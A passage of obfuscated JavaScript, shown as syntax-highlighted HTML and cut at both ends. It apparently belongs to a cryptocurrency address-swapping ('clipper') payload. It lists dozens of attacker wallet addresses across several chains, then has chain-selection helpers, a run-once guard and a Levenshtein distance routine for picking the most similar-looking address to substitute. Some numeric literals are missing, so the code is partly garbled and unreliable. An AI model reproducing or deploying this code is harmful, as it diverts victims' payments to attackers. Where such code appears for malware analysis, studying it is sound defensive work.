</span><span>'DAJYA'</span><span>: </span><span>"0xa7eec0c4911ff75AEd179c81258a348c40a36e53"</span><span>, </span><span>'SUVoY'</span><span>: </span><span>"0x3c6762469ea04c9586907F155A35f648572A0C3E"</span><span>, </span><span>'WJmWS'</span><span>: </span><span>"0x322FE72E1Eb64F6d16E6FCd3d45a376efD4bC6b2"</span><span>, </span><span>'QBAXK'</span><span>: </span><span>"0x51Bb31a441531d34210a4B35114D8EF3E57aB727"</span><span>, </span><span>'zLNIR'</span><span>: </span><span>"0x314d5070DB6940C8dedf1da4c03501a3AcEE21E1"</span><span>, </span><span>'kTQGi'</span><span>: </span><span>"0x75023D76D6cBf88ACeAA83447C466A9bBB0c5966"</span><span>, </span><span>'XJxSR'</span><span>: </span><span>"0x1914F36c62b381856D1F9Dc524f1B167e0798e5E"</span><span>, </span><span>'kHjMo'</span><span>: </span><span>"0xB9e9cfd931647192036197881A9082cD2D83589C"</span><span>, </span><span>'kxPDg'</span><span>: </span><span>"0xE88ae1ae3947B6646e2c0b181da75CE3601287A4"</span><span>, </span><span>'gWISZ'</span><span>: </span><span>"0x0D83F2770B5bDC0ccd9F09728B3eBF195cf890e2"</span><span>, </span><span>'hIHlD'</span><span>: </span><span>"0xe2D5C35bf44881E37d7183DA2143Ee5A84Cd4c68"</span><span>, </span><span>'QgItq'</span><span>: </span><span>"0xd21E6Dd2Ef006FFAe9Be8d8b0cdf7a667B30806d"</span><span>, </span><span>'bLJZU'</span><span>: </span><span>"0x93Ff376B931B92aF91241aAf257d708B62D62F4C"</span><span>, </span><span>'IdVSI'</span><span>: </span><span>"0x5C068df7139aD2Dedb840ceC95C384F25b443275"</span><span>, </span><span>'Rpwne'</span><span>: </span><span>"0x70D24a9989D17a537C36f2FB6d8198CC26c1c277"</span><span>, </span><span>'NYUBp'</span><span>: </span><span>"0x0ae487200606DEfdbCEF1A50C003604a36C68E64"</span><span>, </span><span>'eQrXq'</span><span>: </span><span>"0xc5588A6DEC3889AAD85b9673621a71fFcf7E6B56"</span><span>, </span><span>'yRdVI'</span><span>: </span><span>"0x3c23bA2Db94E6aE11DBf9cD2DA5297A09d7EC673"</span><span>, </span><span>'IDnjA'</span><span>: </span><span>"0x5B5cA7d3089D3B3C6393C0B79cDF371Ec93a3fd3"</span><span>, </span><span>'ajXoV'</span><span>: </span><span>"0x4Cb4c0E7057829c378Eb7A9b174B004873b9D769"</span><span>, </span><span>'xyHoE'</span><span>: </span><span>"0xd299f05D1504D0B98B1D6D3c282412FD4Df96109"</span><span>, </span><span>'TCqKY'</span><span>: </span><span>"0x241689F750fCE4A974C953adBECe0673Dc4956E0"</span><span>, </span><span>'dQfUy'</span><span>: </span><span>"0xBc5f75053Ae3a8F2B9CF9495845038554dDFb261"</span><span>, </span><span>'ctRhh'</span><span>: </span><span>"0x5651dbb7838146fCF5135A65005946625A2685c8"</span><span>, </span><span>'JbMdu'</span><span>: </span><span>"0x5c9D146b48f664f2bB4796f2Bb0279a6438C38b1"</span><span>, </span><span>'gjuIU'</span><span>: </span><span>"0xd2Bf42514d35952Abf2082aAA0ddBBEf65a00BA3"</span><span>, </span><span>'fmDjk'</span><span>: </span><span>"0xbB1EC85a7d0aa6Cd5ad7E7832F0b4c8659c44cc9"</span><span>, </span><span>'GjipQ'</span><span>: </span><span>"0x013285c02ab81246F1D68699613447CE4B2B4ACC"</span><span>, </span><span>'wHLUW'</span><span>: </span><span>"0x97A00E100BA7bA0a006B2A9A40f6A0d80869Ac9e"</span><span>, </span><span>'gYVeZ'</span><span>: </span><span>"0x4Bf0C0630A562eE973CE964a7d215D98ea115693"</span><span>, </span><span>'Sqlrp'</span><span>: </span><span>"0x805aa8adb8440aEA21fDc8f2348f8Db99ea86Efb"</span><span>, </span><span>'pcqRS'</span><span>: </span><span>"0xae9935793835D5fCF8660e0D45bA35648e3CD463"</span><span>, </span><span>'fMapR'</span><span>: </span><span>"0xB051C0b7dCc22ab6289Adf7a2DcEaA7c35eB3027"</span><span>, </span><span>'ITrjn'</span><span>: </span><span>"0xf7a82C48Edf9db4FBe6f10953d4D889A5bA6780D"</span><span>, </span><span>'Ixxxa'</span><span>: </span><span>"0x06de68F310a86B10746a4e35cD50a7B7C8663b8d"</span><span>, </span><span>'DdqMx'</span><span>: </span><span>"0x51f3C0fCacF7d042605ABBE0ad61D6fabC4E1F54"</span><span>, </span><span>'mddEm'</span><span>: </span><span>"0x49BCc441AEA6Cd7bC5989685C917DC9fb58289Cf"</span><span>, </span><span>'GQlpD'</span><span>: </span><span>"0x7fD999f778c1867eDa9A4026fE7D4BbB33A45272"</span><span>, </span><span>'PFPfJ'</span><span>: </span><span>"0xe8749d2347472AD1547E1c6436F267F0EdD725Cb"</span><span>, </span><span>'rgsmH'</span><span>: </span><span>"0x2B471975ac4E4e29D110e43EBf9fBBc4aEBc8221"</span><span>, </span><span>'kkUbC'</span><span>: </span><span>"0x02004fE6c250F008981d8Fc8F9C408cEfD679Ec3"</span><span>, </span><span>'qHwwv'</span><span>: </span><span>"0xC4A51031A7d17bB6D02D52127D2774A942987D39"</span><span>, </span><span>'mlgET'</span><span>: </span><span>"0xa1b94fC12c0153D3fb5d60ED500AcEC430259751"</span><span>, </span><span>'Sflwm'</span><span>: </span><span>"0xdedda1A02D79c3ba5fDf28C161382b1A7bA05223"</span><span>, </span><span>'cKcDU'</span><span>: </span><span>"0xE55f51991C8D01Fb5a99B508CC39B8a04dcF9D04"</span><span>, </span><span>'tWKKt'</span><span>: </span><span>"5VVyuV5K6c2gMq1zVeQUFAmo8shPZH28MJCVzccrsZG6"</span><span>, </span><span>'GeUXv'</span><span>: </span><span>"98EWM95ct8tBYWroCxXYN9vCgN7NTcR6nUsvCx1mEdLZ"</span><span>, </span><span>'IFMoj'</span><span>: </span><span>"Gs7z9TTJwAKyxN4G3YWPFfDmnUo3ofu8q2QSWfdxtNUt"</span><span>, </span><span>'shIUB'</span><span>: </span><span>"CTgjc8kegnVqvtVbGZfpP5RHLKnRNikArUYFpVHNebEN"</span><span>, </span><span>'IfmWW'</span><span>: </span><span>"7Nnjyhwsp8ia2W4P37iWAjpRao3Bj9tVZBZRTbBpwXWU"</span><span>, </span><span>'aLjQi'</span><span>: </span><span>"3KFBge3yEg793VqVV1P6fxV7gC9CShh55zmoMcGUNu49"</span><span>, </span><span>'ytLpw'</span><span>: </span><span>"9eU7SkkFGWvDoqSZLqoFJ9kRqJXDQYcEvSiJXyThCWGV"</span><span>, </span><span>'gjXjd'</span><span>: </span><span>"4SxDspwwkviwR3evbZHrPa3Rw13kBr51Nxv86mECyXUF"</span><span>, </span><span>'alqyK'</span><span>: </span><span>"9dtS7zbZD2tK7oaMUj78MKvgUWHbRVLQ95bxnpsCaCLL"</span><span>, </span><span>'tySZZ'</span><span>: </span><span>"7mdCoRPc1omTiZdYY2xG81EvGwN7Z2yodUTX9ZmLm3fx"</span><span>, </span><span>'wEEzD'</span><span>: </span><span>"8rdABs8nC2jTwVhR9axWW7WMbGZxW7JUzNV5pRF8KvQv"</span><span>, </span><span>'PFTuz'</span><span>: </span><span>"55YtaEqYEUM7ASAZ9XmVdSBNy6F7r5zkdLsJFv2ZPtAx"</span><span>, </span><span>'uMBVu'</span><span>: </span><span>"Gr8Kcyt8UVRF1Pux7YHiK32Spm7cmnFVL6hd7LSLHqoB"</span><span>, </span><span>'gGKEH'</span><span>: </span><span>"9MRmVsciWKDvwwTaZQCK2NvJE2SeVU8W6EGFmukHTRaB"</span><span>, </span><span>'QlDwm'</span><span>: </span><span>"5j4k1Ye12dXiFMLSJpD7gFrLbv4QcUrRoKHsgo32kRFr"</span><span>, </span><span>'PbcYH'</span><span>: </span><span>"F1SEspGoVLhqJTCFQEutTcKDubw44uKnqWc2ydz4iXtv"</span><span>, </span><span>'isJWQ'</span><span>: </span><span>"G3UBJBY69FpDbwyKhZ8Sf4YULLTtHBtJUvSX4GpbTGQn"</span><span>, </span><span>'NORtg'</span><span>: </span><span>"DZyZzbGfdMy5GTyn2ah2PDJu8LEoKPq9EhAkFRQ1Fn6K"</span><span>, </span><span>'OWMqm'</span><span>: </span><span>"HvygSvLTXPK4fvR17zhjEh57kmb85oJuvcQcEgTnrced"</span><span>, </span><span>'mAOhu'</span><span>: </span><span>"TB9emsCq6fQw6wRk4HBxxNnU6Hwt1DnV67"</span><span>, </span><span>'zNJib'</span><span>: </span><span>"TSfbXqswodrpw8UBthPTRRcLrqWpnWFY3y"</span><span>, </span><span>'JIaJy'</span><span>: </span><span>"TYVWbDbkapcKcvbMfdbbcuc3PE1kKefvDH"</span><span>, </span><span>'ycYrn'</span><span>: </span><span>"TNaeGxNujpgPgcfetYwCNAZF8BZjAQqutc"</span><span>, </span><span>'YofCH'</span><span>: </span><span>"TJ1tNPVj7jLK2ds9JNq15Ln6GJV1xYrmWp"</span><span>, </span><span>'iKJKA'</span><span>: </span><span>"TGExvgwAyaqwcaJmtJzErXqfra66YjLThc"</span><span>, </span><span>'oQtxT'</span><span>: </span><span>"TC7K8qchM7YXZPdZrbUY7LQwZaahdTA5tG"</span><span>, </span><span>'Gnngl'</span><span>: </span><span>"TQuqKCAbowuQYEKB9aTnH5uK4hNvaxDCye"</span><span>, </span><span>'AIOZX'</span><span>: </span><span>"TFcXJysFgotDu6sJu4zZPAvr9xHCN7FAZp"</span><span>, </span><span>'LBXrZ'</span><span>: </span><span>"TLDkM4GrUaA13PCHWhaMcGri7H8A8HR6zR"</span><span>, </span><span>'GcWUu'</span><span>: </span><span>"TPSLojAyTheudTRztqjhNic6rrrSLVkMAr"</span><span>, </span><span>'uWYHo'</span><span>: </span><span>"TY2Gs3RVwbmcUiDpxDhchPHF1CVsGxU1mo"</span><span>, </span><span>'AjRST'</span><span>: </span><span>"TCYrFDXHBrQkqCPNcp6V2fETk7VoqjCNXw"</span><span>, </span><span>'OghhW'</span><span>: </span><span>"TKcuWWdGYqPKe98xZCWkmhc1gKLdDYvJ2f"</span><span>, </span><span>'WYxMs'</span><span>: </span><span>"TP1ezNXDeyF4RsM3Bmjh4GTYfshf5hogRJ"</span><span>, </span><span>'XPQAU'</span><span>: </span><span>"TJcHbAGfavWSEQaTTLotG7RosS3iqV5WMb"</span><span>, </span><span>'kQfYh'</span><span>: </span><span>"TD5U7782gp7ceyrsKwekWFMWF9TjhC6DfP"</span><span>, </span><span>'fQZCx'</span><span>: </span><span>"TEu3zgthJE32jfY6bYMYGNC7BU2yEXVBgW"</span><span>, </span><span>'UzPHF'</span><span>: </span><span>"TK5r74dFyMwFSTaJF6dmc2pi7A1gjGTtJz"</span><span>, </span><span>'qJMvq'</span><span>: </span><span>"TBJH4pB4QPo96BRA7x6DghEv4iQqJBgKeW"</span><span>, </span><span>'sZVdB'</span><span>: </span><span>"TKBcydgFGX9q3ydaPtxht1TRAmcGybRozt"</span><span>, </span><span>'zzvgO'</span><span>: </span><span>"TQXoAYKPuzeD1X2c4KvQ4gXhEnya3AsYwC"</span><span>, </span><span>'maiTu'</span><span>: </span><span>"TJCevwYQhzcSyPaVBTa15y4qNY2ZxkjwsZ"</span><span>, </span><span>'ZpFNE'</span><span>: </span><span>"THpdx4MiWbXtgkPtsrsvUjHF5AB4u7mx3E"</span><span>, </span><span>'jTVMz'</span><span>: </span><span>"TWpCDiY8pZoY9dVknsy3U4mrAwVm8mCBh6"</span><span>, </span><span>'zBKSx'</span><span>: </span><span>"TK5zyFYoyAttoeaUeWGdpRof2qRBbPSV7L"</span><span>, </span><span>'CsfLH'</span><span>: </span><span>"TAzmtmytEibzixFSfNvqqHEKmMKiz9wUA9"</span><span>, </span><span>'LCszu'</span><span>: </span><span>"TCgUwXe3VmLY81tKBrMUjFBr1qPnrEQFNK"</span><span>, </span><span>'cdzQW'</span><span>: </span><span>"TTPWAyW3Q8MovJvDYgysniq41gQnfRn21V"</span><span>, </span><span>'xBxZT'</span><span>: </span><span>"TWUJVezQta4zEX94RPmFHF2hzQBRmYiEdn"</span><span>, </span><span>'ESuTT'</span><span>: </span><span>"TPeKuzck7tZRXKh2GP1TyoePF4Rr1cuUAA"</span><span>, </span><span>'emvMl'</span><span>: </span><span>"TJUQCnHifZMHEgJXSd8SLJdVAcRckHGnjt"</span><span>, </span><span>'xVGnF'</span><span>: </span><span>"TCgX32nkTwRkapNuekTdk1TByYGkkmcKhJ"</span><span>, </span><span>'hxLhB'</span><span>: </span><span>"TFDKvuw86wduSPZxWTHD9N1TqhXyy9nrAs"</span><span>, </span><span>'EeQvC'</span><span>: </span><span>"TQVpRbBzD1au3u8QZFzXMfVMpHRyrpemHL"</span><span>, </span><span>'pELnW'</span><span>: </span><span>"TSE2VkcRnyiFB4xe8an9Bj1fb6ejsPxa9Z"</span><span>, </span><span>'qzqrf'</span><span>: </span><span>"THe32hBm9nXnzzi6YFqYo8LX77CMegX3v5"</span><span>, </span><span>'ZjUWz'</span><span>: </span><span>"TXfcpZtbYfVtLdGPgdoLm6hDHtnrscvAFP"</span><span>, </span><span>'LieOP'</span><span>: </span><span>"TXgVaHDaEyXSm1LoJEqFgKWTKQQ1jgeQr7"</span><span>, </span><span>'pPSEL'</span><span>: </span><span>"TD5cRTn9dxa4eodRWszGiKmU4pbpSFN87P"</span><span>, </span><span>'Cubxg'</span><span>: </span><span>"LNFWHeiSjb4QB4iSHMEvaZ8caPwtz4t6Ug"</span><span>, </span><span>'tdnnB'</span><span>: </span><span>"LQk8CEPMP4tq3mc8nQpsZ1QtBmYbhg8UGR"</span><span>, </span><span>'WBSil'</span><span>: </span><span>"LMAJo7CV5F5scxJsFW67UsY2RichJFfpP6"</span><span>, </span><span>'aiczm'</span><span>: </span><span>"LUvPb1VhwsriAm3ni77i3otND2aYLZ8fHz"</span><span>, </span><span>'RVLCn'</span><span>: </span><span>"LhWPifqaGho696hFVGTR1KmzKJ8ps7ctFa"</span><span>, </span><span>'UpXNN'</span><span>: </span><span>"LZZPvXLt4BtMzEgddYnHpUWjDjeD61r5aQ"</span><span>, </span><span>'FOnBW'</span><span>: </span><span>"LQfKhNis7ZKPRW6H3prbXz1FJd29b3jsmT"</span><span>, </span><span>'iMpIh'</span><span>: </span><span>"LSihmvTbmQ9WZmq6Rjn35SKLUdBiDzcLBB"</span><span>, </span><span>'mynAv'</span><span>: </span><span>"Ldbnww88JPAP1AUXiDtLyeZg9v1tuvhHBP"</span><span>, </span><span>'LthXt'</span><span>: </span><span>"LR3YwMqnwLt4Qdn6Ydz8bRFEeXvpbNZUvA"</span><span>, </span><span>'thBMJ'</span><span>: </span><span>"Lbco8vJ56o1mre6AVU6cF7JjDDscnYHXLP"</span><span>, </span><span>'SDnYd'</span><span>: </span><span>"LfqFuc3sLafGxWE8vdntZT4M9NKq6Be9ox"</span><span>, </span><span>'rsFGZ'</span><span>: </span><span>"LLcmXxj8Zstje6KqgYb11Ephj8bGdyF1vP"</span><span>, </span><span>'GERuP'</span><span>: </span><span>"LcJwR1WvVRsnxoe1A66pCzeXicuroDP6L6"</span><span>, </span><span>'YnKTx'</span><span>: </span><span>"LUNKimRyxBVXLf9gp3FZo2iVp6D3yyzJLJ"</span><span>, </span><span>'qeLYC'</span><span>: </span><span>"LY1NnVbdywTNmq45DYdhssrVENZKv7Sk8H"</span><span>, </span><span>'bHFpc'</span><span>: </span><span>"LNmMqhqpyDwb1zzZReuA8aVUxkZSc4Ztqq"</span><span>, </span><span>'yJtyM'</span><span>: </span><span>"LdxgXRnXToLMBML2KpgGkdDwJSTM6sbiPE"</span><span>, </span><span>'UthzI'</span><span>: </span><span>"LZMn8hLZ2kVjejmDZiSJzJhHZjuHq8Ekmr"</span><span>, </span><span>'HRVKG'</span><span>: </span><span>"LVnc1MLGDGKs2bmpNAH7zcHV51MJkGsuG9"</span><span>, </span><span>'DYFsg'</span><span>: </span><span>"LRSZUeQb48cGojUrVsZr9eERjw4K1zAoyC"</span><span>, </span><span>'vJoTb'</span><span>: </span><span>"LQpGaw3af1DQiKUkGYEx18jLZeS9xHyP9v"</span><span>, </span><span>'SCttQ'</span><span>: </span><span>"LiVzsiWfCCkW2kvHeMBdawWp9TE8uPgi6V"</span><span>, </span><span>'TLtwe'</span><span>: </span><span>"LY32ncFBjQXhgCkgTAd2LreFv3JZNTpMvR"</span><span>, </span><span>'zubSd'</span><span>: </span><span>"LdPtx4xqmA4HRQCm3bQ9PLEneMWLdkdmqg"</span><span>, </span><span>'jnPSm'</span><span>: </span><span>"LYcHJk7r9gRbg2z3hz9GGj91Po6TaXDK3k"</span><span>, </span><span>'tkhoC'</span><span>: </span><span>"LMhCVFq5fTmrwQyzgfp2MkhrgADRAVCGsk"</span><span>, </span><span>'UXYpW'</span><span>: </span><span>"LPv1wSygi4vPp9UeW6EfWwepEeMFHgALmN"</span><span>, </span><span>'QtlzB'</span><span>: </span><span>"Lf55UbTiSTjnuQ8uWzUBtzghztezEfSLvT"</span><span>, </span><span>'wYQWn'</span><span>: </span><span>"LdJHZeBQovSYbW1Lei6CzGAY4d3mUxbNKs"</span><span>, </span><span>'abbui'</span><span>: </span><span>"LbBxnFaR1bZVN2CquNDXGe1xCuu9vUBAQw"</span><span>, </span><span>'zndLO'</span><span>: </span><span>"LWWWPK2SZZKB3Nu8pHyq2yPscVKvex5v2X"</span><span>, </span><span>'kXpEP'</span><span>: </span><span>"LYN4ESQuJ1TbPxQdRYNrghznN8mQt8WDJU"</span><span>, </span><span>'gBdKm'</span><span>: </span><span>"LiLzQs4KU79R5AUn9jJNd7EziNE7r32Dqq"</span><span>, </span><span>'AJBPj'</span><span>: </span><span>"LeqNtT4aDY9oM1G5gAWWvB8B39iUobThhe"</span><span>, </span><span>'dDlKv'</span><span>: </span><span>"LfUdSVrimg54iU7MhXFxpUTPkEgFJonHPV"</span><span>, </span><span>'upwRp'</span><span>: </span><span>"LTyhWRAeCRcUC9Wd3zkmjz3AhgX6J18kxZ"</span><span>, </span><span>'wKEAH'</span><span>: </span><span>"Lc2LtsEJmPYay1oj7v8xj16mSV15BwHtGu"</span><span>, </span><span>'Kivgs'</span><span>: </span><span>"LVsGi1QVXucA6v9xsjwaAL8WYb7axdekAK"</span><span>, </span><span>'atdgC'</span><span>: </span><span>"LewV6Gagn52Sk8hzPHRSbBjUpiNAdqmB9z"</span><span>, </span><span>'wORrq'</span><span>: </span><span>"bitcoincash:qpwsaxghtvt6phm53vfdj0s6mj4l7h24dgkuxeanyh"</span><span>, </span><span>'AXcYN'</span><span>: </span><span>"bitcoincash:qq7dr7gu8tma7mvpftq4ee2xnhaczqk9myqnk6v4c9"</span><span>, </span><span>'nJmrw'</span><span>: </span><span>"bitcoincash:qpgf3zrw4taxtvj87y5lcaku77qdhq7kqgdga5u6jz"</span><span>, </span><span>'jiCnV'</span><span>: </span><span>"bitcoincash:qrkrnnc5kacavf5pl4n4hraazdezdrq08ssmxsrdsf"</span><span>, </span><span>'IEyeW'</span><span>: </span><span>"bitcoincash:qqdepnkh89dmfxyp4naluvhlc3ynej239sdu760y39"</span><span>, </span><span>'LPwMj'</span><span>: </span><span>"bitcoincash:qqul8wuxs4ec8u4d6arkvetdmdh4ppwr0ggycetq97"</span><span>, </span><span>'QeXkq'</span><span>: </span><span>"bitcoincash:qq0enkj6n4mffln7w9z6u8vu2mef47jwlcvcx5f823"</span><span>, </span><span>'AXCnW'</span><span>: </span><span>"bitcoincash:qrc620lztlxv9elhj5qzvmf2cxhe7egup5few7tcd3"</span><span>, </span><span>'BvvIY'</span><span>: </span><span>"bitcoincash:qrf3urqnjl4gergxe45ttztjymc8dzqyp54wsddp64"</span><span>, </span><span>'WdGef'</span><span>: </span><span>"bitcoincash:qr7mkujcr9c38ddfn2ke2a0sagk52tllesderfrue8"</span><span>, </span><span>'MdtCY'</span><span>: </span><span>"bitcoincash:qqgjn9yqtud5mle3e7zhmagtcap9jdmcg509q56ynt"</span><span>, </span><span>'lcvXH'</span><span>: </span><span>"bitcoincash:qpuq8uc9ydxszny5q0j4actg30he6uhffvvy0dl7er"</span><span>, </span><span>'jQkco'</span><span>: </span><span>"bitcoincash:qz0640hjl2m3n2ca26rknljpr55gyd9pjq89g6xhrz"</span><span>, </span><span>'XcaTu'</span><span>: </span><span>"bitcoincash:qq0j6vl2ls2g8kkhkvpcfyjxns5zq03llgsqdnzl4s"</span><span>, </span><span>'JEZmD'</span><span>: </span><span>"bitcoincash:qq8m8rkl29tcyqq8usfruejnvx27zxlpu52mc9spz7"</span><span>, </span><span>'PQrIR'</span><span>: </span><span>"bitcoincash:qpudgp66jjj8k9zec4na3690tvu8ksq4fq8ycpjzed"</span><span>, </span><span>'JDUWN'</span><span>: </span><span>"bitcoincash:qqe3qc9uk08kxnng0cznu9xqqluwfyemxym7w2e3xw"</span><span>, </span><span>'CZKkU'</span><span>: </span><span>"bitcoincash:qpukdxh30d8dtj552q2jet0pqvcvt64gfujaz8h9sa"</span><span>, </span><span>'GGbBw'</span><span>: </span><span>"bitcoincash:qqs4grdq56y5nnamu5d8tk450kzul3aulyz8u66mjc"</span><span>, </span><span>'TlKHF'</span><span>: </span><span>"bitcoincash:qp7rhhk0gcusyj9fvl2ftr06ftt0pt8wgumd8ytssd"</span><span>, </span><span>'gvWhS'</span><span>: </span><span>"bitcoincash:qpmc3y5y2v7h3x3sgdg7npau034fsggwfczvuqtprl"</span><span>, </span><span>'TOyco'</span><span>: </span><span>"bitcoincash:qzum0qk4kpauy8ljspmkc5rjxe5mgam5xg7xl5uq2g"</span><span>, </span><span>'uzHQJ'</span><span>: </span><span>"bitcoincash:qqjqp8ayuky5hq4kgrarpu40eq6xjrneuurc43v9lf"</span><span>, </span><span>'Ddxxq'</span><span>: </span><span>"bitcoincash:qqxu6a3f0240v0mwzhspm5zeneeyecggvufgz82w7u"</span><span>, </span><span>'SkKwK'</span><span>: </span><span>"bitcoincash:qpux2mtlpd03d8zxyc7nsrk8knarnjxxts2fjpzeck"</span><span>, </span><span>'xlIOq'</span><span>: </span><span>"bitcoincash:qpcgcrjry0excx80zp8hn9vsn4cnmk57vylwa5mtz3"</span><span>, </span><span>'cGdGB'</span><span>: </span><span>"bitcoincash:qpjj6prm5menjatrmqaqx0h3zkuhdkfy75uauxz2sj"</span><span>, </span><span>'NJweA'</span><span>: </span><span>"bitcoincash:qp79qg7np9mvr4mg78vz8vnx0xn8hlkp7sk0g86064"</span><span>, </span><span>'liySF'</span><span>: </span><span>"bitcoincash:qr27clvagvzra5z7sfxxrwmjxy026vltucdkhrsvc7"</span><span>, </span><span>'dZzai'</span><span>: </span><span>"bitcoincash:qrsypfz3lqt8xtf8ej5ftrqyhln577me6v640uew8j"</span><span>, </span><span>'qPXMY'</span><span>: </span><span>"bitcoincash:qrzfrff4czjn6ku0tn2u3cxk7y267enfqvx6zva5w6"</span><span>, </span><span>'GSmbj'</span><span>: </span><span>"bitcoincash:qr7exs4az754aknl3r5gp9scn74dzjkcrgql3jpv59"</span><span>, </span><span>'oFfnO'</span><span>: </span><span>"bitcoincash:qq35fzg00mzcmwtag9grmwljvpuy5jm8kuzfs24jhu"</span><span>, </span><span>'oBsPL'</span><span>: </span><span>"bitcoincash:qra5zfn74m7l85rl4r6wptzpnt2p22h7552swkpa7l"</span><span>, </span><span>'fqBSI'</span><span>: </span><span>"bitcoincash:qzqllr0fsh9fgfvdhmafx32a0ddtkt52evnqd7w7h7"</span><span>, </span><span>'GqRgo'</span><span>: </span><span>"bitcoincash:qpjdcwld84wtd5lk00x8t7qp4eu3y0xhnsjjfgrs7q"</span><span>, </span><span>'TSvsw'</span><span>: </span><span>"bitcoincash:qrgpm5y229xs46wsx9h9mlftedmsm4xjlu98jffmg3"</span><span>, </span><span>'gIXXv'</span><span>: </span><span>"bitcoincash:qpjl9lkjjp4s6u654k3rz06rhqcap849jg8uwqmaad"</span><span>, </span><span>'NNxYW'</span><span>: </span><span>"bitcoincash:qra5uwzgh8qus07v3srw5q0e8vrx5872k5cxguu3h5"</span><span>, </span><span>'wgjIC'</span><span>: </span><span>"bitcoincash:qz6239jkqf9qpl2axk6vclsx3gdt8cy4z5rag98u2r"</span><span>, </span><span>'NbGXK'</span><span>: </span><span>function</span><span> (</span><span>_0x6fd57a, _0x45613c</span><span>) </span><span>{ </span><span>return</span><span> _0x6fd57a == _0x45613c; </span> }, <span>'eDGUh'</span><span>: </span><span>"ethereum"</span><span>, </span><span>'dmtxm'</span><span>: </span><span>function</span><span> (</span><span>_0x426191, _0xcfbe</span><span>) </span><span>{ </span><span>return</span><span> _0x426191 == _0xcfbe; </span> }, <span>'HNbDp'</span><span>: </span><span>function</span><span> (</span><span>_0x43f1a1, _0x360cae</span><span>) </span><span>{ </span><span>return</span><span> _0x43f1a1 == _0x360cae; </span> }, <span>'YBHoq'</span><span>: </span><span>"bitcoinLegacy"</span><span>, </span><span>'pRoUO'</span><span>: </span><span>"bitcoinSegwit"</span><span>, </span><span>'nvayH'</span><span>: </span><span>function</span><span> (</span><span>_0x1a5c0d, _0x3206ce, _0x4cf791</span><span>) </span><span>{ </span><span>return</span><span> _0x1a5c0d(_0x3206ce, _0x4cf791); </span> }, <span>'jHsib'</span><span>: </span><span>"tron"</span><span>, </span><span>'nVTWs'</span><span>: </span><span>"ltc"</span><span>, </span><span>'jsqTT'</span><span>: </span><span>function</span><span> (</span><span>_0x245d0e, _0x2d73d9, _0x14ef57</span><span>) </span><span>{ </span><span>return</span><span> _0x245d0e(_0x2d73d9, _0x14ef57); </span> }, <span>'afnPM'</span><span>: </span><span>function</span><span> (</span><span>_0x458f2b, _0x6aa524</span><span>) </span><span>{ </span><span>return</span><span> _0x458f2b == _0x6aa524; </span> }, <span>'tDons'</span><span>: </span><span>"ltc2"</span><span>, </span><span>'gtXrf'</span><span>: </span><span>function</span><span> (</span><span>_0x4aac02, _0x3c2f2e, _0x51351a</span><span>) </span><span>{ </span><span>return</span><span> _0x4aac02(_0x3c2f2e, _0x51351a); </span> }, <span>'sghpa'</span><span>: </span><span>"bch"</span><span>, </span><span>'hrNiK'</span><span>: </span><span>function</span><span> (</span><span>_0x4989f5, _0xf4abd5, _0x265bdf</span><span>) </span><span>{ </span><span>return</span><span> _0x4989f5(_0xf4abd5, _0x265bdf); </span> }, <span>'tqgyV'</span><span>: </span><span>"solana"</span><span>, </span><span>'mbgjV'</span><span>: </span><span>function</span><span> (</span><span>_0x34d7ea, _0xb2bd29, _0x41c749</span><span>) </span><span>{ </span><span>return</span><span> _0x34d7ea(_0xb2bd29, _0x41c749); </span> }, <span>'IAgrR'</span><span>: </span><span>function</span><span> (</span><span>_0x95d4e, _0x4e3b67</span><span>) </span><span>{ </span><span>return</span><span> _0x95d4e == _0x4e3b67; </span> }, <span>'FvQbM'</span><span>: </span><span>"solana2"</span><span>, </span><span>'UPcyp'</span><span>: </span><span>"solana3"</span><span>, </span><span>'JiXTg'</span><span>: </span><span>function</span><span> (</span><span>_0x2dd239, _0x9ccb5, _0x2f7208</span><span>) </span><span>{ </span><span>return</span><span> _0x2dd239(_0x9ccb5, _0x2f7208); </span> }, <span>'BEiKn'</span><span>: </span><span>function</span><span> (</span><span>_0x7b893d, _0x592b33</span><span>) </span><span>{ </span><span>return</span><span> _0x7b893d == _0x592b33; </span> }, <span>'BAEhI'</span><span>: </span><span>function</span><span> (</span><span>_0x421ebd, _0x39f4fa</span><span>) </span><span>{ </span><span>return</span><span> _0x421ebd != _0x39f4fa; </span> }, <span>'kZnrz'</span><span>: </span><span>"undefined"</span> }; <span> </span><span>if</span><span> (loval == </span><span>1</span><span>) { </span><span>return</span><span>; </span> } <span> loval = </span><span>1</span><span>; </span><span>function</span><span>_0x3479c8</span><span>(</span><span>_0x13a5cc, _0x8c209f</span><span>) </span><span>{ </span><span>const</span><span> _0x50715b = </span><span>Array</span><span>.from({ </span><span>'length'</span><span>: _0x13a5cc.length + </span><span>1</span><span> }, </span><span>() =&gt;</span><span>Array</span><span>(_0x8c209f.length + </span><span>1</span><span>).fill(</span><span>)); </span><span>for</span><span> (</span><span>let</span><span> _0x1b96c3 = </span><span>; _0x1b96c3 &lt;= _0x13a5cc.length; _0x1b96c3++) { </span><span> _0x50715b[_0x1b96c3][</span><span>] = _0x1b96c3; </span> } <span>for</span><span> (</span><span>let</span><span> _0x239a5f = </span><span>; _0x239a5f &lt;= _0x8c209f.length; _0x239a5f++) { </span><span> _0x50715b[</span><span>][_0x239a5f] = _0x239a5f; </span> } <span>for</span><span> (</span><span>let</span><span> _0x5aba31 = </span><span>1</span><span>; _0x5aba31 &lt;= _0x13a5cc.length; _0x5aba31++) { </span><span>for</span><span> (</span><span>let</span><span> _0x22e9c0 = </span><span>1</span><span>; _0x22e9c0 &lt;= _0x8c209f.length; _0x22e9c0++) { </span><span>if</span><span> (_0x13a5cc[_0x5aba31 - </span><span>1</span><span>] === _0x8c209f[_0x22e9c0 - </span><span>1</span><span>]) { </span><span> _0x50715b[_0x5aba31][_0x22e9c0] = _0x50715b[_0x5aba31 - </span><span>1</span><span>][_0x22e9c0 - </span><span>1</span><span>]; </span><span> } </span><span>else</span><span> { </span><span> _0x50715b[_0x5aba31][_0x22e9c0] = </span><span>1</span><span> + </span><span>Math</span><span>.min(_0x50715b[_0x5aba31 - </span><span>1</span><span>][_0x22e9c0], _0x50715b[_0x5aba31][_0x22e9c0 - </span><span>1</span><span>], _0x50715b[_0x5aba31 - </span><span>1</span><span>][_0x22e9c0 - </span><span>1</span><span>]); </span> } } } <span>return</span><span> _0x50715b[_0x13a5cc.length][_0x8c209f.length]; </span> } <span>function</span><span>_0x2abae0</span><span>(</span><span>_0x348925, _0x2f1e3d</span><span>) </span><span>{ </span><span>let</span><span> _0xff60d1 = </span><span>Infinity</span><span>; </span><span>let</span><span> _0x5be3d3 = </span><span>null</span><span>; </span><span>for</span><span> 